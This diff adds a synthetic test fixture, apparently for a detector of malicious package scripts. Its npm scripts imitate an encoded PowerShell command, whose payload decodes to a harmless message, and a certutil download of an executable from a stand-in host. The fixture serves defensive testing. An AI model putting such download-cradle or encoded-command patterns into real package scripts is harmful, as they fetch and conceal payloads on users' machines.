@@ -1,0 +1,8 @@
+{
+  "//": "SYNTHETIC TEST FIXTURE — not functional",
+  "name": "fixture",
+  "scripts": {
+    "setup:win": "{{POWERSHELL}} {{ENC_FLAG}} VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAgAGYAcgBvAG0AIAB0AGgAZQAgAHMAeQBuAHQAaABlAHQAaQBjACAAZgBpAHgAdAB1AHIAZQA7ACAAbgBvAHQAIAByAHUAbgAnAA==",
+    "fetch:win": "{{CERTUTIL}} -urlcache -f https://payload.example.invalid/t.exe t.exe"
+  }
+}
